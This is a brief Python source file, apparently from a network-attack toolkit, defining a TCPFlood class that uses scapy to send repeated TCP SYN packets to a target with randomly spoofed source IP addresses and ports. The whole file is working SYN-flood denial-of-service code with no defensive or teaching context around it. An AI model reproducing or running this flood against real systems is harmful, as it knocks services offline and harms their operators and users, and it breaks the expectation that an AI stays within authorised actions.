# @Time    : 2020/12/4 11:40 下午
# @Author  : h0rs3fa11
# @FileName: tcp_socket.py
# @Software: PyCharm
from scapy.all import IP, TCP, send
from lib.utils.address import random_ip, random_port


# TODO:need to get open port
class TCPFlood:
    def __init__(self, target):
        self.target = target

    def send_packet(self, dst_port, count):
        for _ in range(count):
            packet = IP(src=random_ip(), dst=self.target) / TCP(sport=random_port(), dport=dst_port, flags='S')
            send(packet)
